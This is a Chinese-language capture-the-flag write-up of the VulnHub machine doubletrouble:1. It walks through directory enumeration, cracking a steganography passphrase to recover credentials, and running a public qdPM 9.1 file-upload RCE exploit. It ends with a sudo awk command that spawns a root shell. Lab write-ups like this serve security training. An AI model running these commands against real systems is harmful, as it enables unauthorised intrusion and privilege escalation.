---
title: vulnhub 做题 doubletrouble:1
tags: [penetration]
date: 2024-10-15 00:00:00
categories: [penetration]
excerpt: day4
---

## vulnhub 做题 doubletrouble : 1

### 扫描

```zsh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

首先还是和上一道题一样的qdpm程序，这次是9.1版本，并且还能打开那个yml文件，但是这道题没开mysql，没法登陆上去（试了一下ssh也登不上去）

### 利用

用goburster扫描路径

```zsh
gobuster dir -u 192.168.169.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/images               (Status: 301) [Size: 319] [--> http://192.168.169.134/images/]
/uploads              (Status: 301) [Size: 320] [--> http://192.168.169.134/uploads/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.169.134/css/]
/template             (Status: 301) [Size: 321] [--> http://192.168.169.134/template/]
/core                 (Status: 301) [Size: 317] [--> http://192.168.169.134/core/]
/install              (Status: 301) [Size: 320] [--> http://192.168.169.134/install/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.169.134/js/]
/sf                   (Status: 301) [Size: 315] [--> http://192.168.169.134/sf/]
/secret               (Status: 301) [Size: 319] [--> http://192.168.169.134/secret/]
/backups              (Status: 301) [Size: 320] [--> http://192.168.169.134/backups/]
/batch                (Status: 301) [Size: 318] [--> http://192.168.169.134/batch/]
/server-status        (Status: 403) [Size: 280]
```

在/secret路径下找到一个doubletrouble.jpg

尝试提取隐写内容
```zsh
└─$ steghide extract -sf doubletrouble.jpg                      
Enter passphrase:

└─$ stegseek  doubletrouble.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] 
Found passphrase: "92camaro"
```

解密出来的内容是一个邮箱和密码
```zsh
└─$ cat doubletrouble.jpg.out              
otisrush@localhost.com
otis666 
```

其实在最开始就找过qdpm的漏洞，但都是要先有一个账号，比如
```zsh
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting     | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                               | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                 | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                 | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                             | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                   | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                   | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (Authenticated)                   | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)        | php/webapps/50944.py
qdPM < 9.1 - Remote Code Execution                                 | multiple/webapps/48146.py
```

比如50944就需要先登录，然后在用户上传自己头像时，由于没有检查文件类型，上传一个php，导致任意代码执行
```zsh
python /usr/share/exploitdb/exploits/php/webapps/50944.py -url http://192.168.169.134/ -u otisrush@localhost.com -p otis666
```

![](/img/pene/6.png)

然后echo一个一句话木马到一个php文件，通过AntSword链接，得到webshell，然后再反弹一个shell

### 提权

uname -a 显示是linux 4.19.0，searchsploit没搜到能用的漏洞。
这时候应该找系统上能够以sudo权限执行的程序

```zsh
$ sudo -l
Matching Defaults entries for www-data on doubletrouble:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on doubletrouble:
    (ALL : ALL) NOPASSWD: /usr/bin/awk
```

```sudo awk 'BEGIN {system("/bin/bash")}'```



